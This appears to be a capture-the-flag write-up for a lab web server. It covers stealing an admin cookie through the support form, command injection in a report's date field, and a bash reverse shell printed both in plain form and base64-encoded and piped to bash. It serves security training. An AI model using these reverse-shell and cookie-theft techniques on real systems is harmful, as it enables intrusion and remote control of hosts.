There are 2 services running, SSH on port 22 and http on port 5000. On visiting the website, I found support endpoint http://10.10.11.8:5000/support. I tried sending request to support and intercepted using burpsuite. It seems, the website is using Werkzeug/2.2.2 library, I have searched for the exploits on internet - It seems in the exploit, it is using /console and apparently that path does not exists. Let’s find more endpoints using gobuster. It seems there is /dashboard endpoint, which is giving 500 - Unauthorized. Meanwhile, I can see there is is_admin cookie in nmap, so maybe I can try to get the the admin cookie with /support endpoint.

Payload

Try this payload in User-Agent and we will get the admin cookie on our listener. Start the listener using python3 -m http.server

Using base64 -d we will get the result in plain text → is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0. Now setting the cookie and visiting /dashboard which was Unauthorized before. By changing the cookie, we can now able to see dashboard.

User Flag

There is a button to generate report. On clicking the button, it is saying Systems are up and running. As it is related to system, first thing that came to my mind is command injection, so I have inserted ls with the date field. And yes, my guess was correct, it is having command injection, now getting the shell. Direct bash rev shell is not spawning, so I have tried base64 encoded shell. To get that shell base64 encode this payload bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1 then send it like this echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjUvNDQ0NCAwPiYx | base64 -d | bash 2>/dev/null It will give us user shell.
